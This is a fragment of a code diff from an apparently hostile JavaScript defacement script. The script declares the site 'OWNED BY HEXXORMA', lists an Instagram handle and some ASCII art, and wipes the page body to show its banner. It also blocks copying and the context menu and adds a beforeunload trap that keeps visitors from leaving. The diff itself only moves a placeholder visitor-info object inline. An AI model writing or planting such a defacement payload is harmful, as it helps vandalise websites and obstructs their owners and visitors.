@@ -6,15 +6,6 @@
   const OWNED_LINE = "YOUR WEBSITE OWNED BY HEXXORMA";
   const INSTAGRAM = "insta:flamingoxx4";
 
-  // ================== معلومات ثابتة (مش محتاجة API) ==================
-  const VISITOR_INFO = {
-    ip: "Hidden",
-    city: "Unknown",
-    region: "Unknown",
-    country: "Unknown",
-    hostname: window.location.hostname || "Unknown"
-  };
-
   // ================== ASCII ART ==================
   const ASCII_ART = String.raw`
                     .""--..__
@@ -86,7 +77,13 @@
 
   // ================== بناء الصفحة ==================
   function buildPage() {
-    const info = VISITOR_INFO;
+    const info = {
+      ip: "Hidden",
+      city: "Unknown",
+      region: "Unknown",
+      hostname: window.location.hostname || "Unknown"
+    };
+    
     const container = document.createElement('div');
     container.className = 'vk-container';
     container.innerHTML = `
@@ -101,6 +98,7 @@
       <div class="vk-owned">${OWNED_LINE}</div>
       <div class="vk-insta">${INSTAGRAM}</div>
     `;
+    
     document.body.innerHTML = '';
     document.body.appendChild(container);
   }
@@ -110,6 +108,7 @@
 
   document.addEventListener('copy', e => e.preventDefault());
   document.addEventListener('contextmenu', e => e.preventDefault());
+  
   window.addEventListener('beforeunload', function(e) {
     e.preventDefault();
     e.returnValue = '';
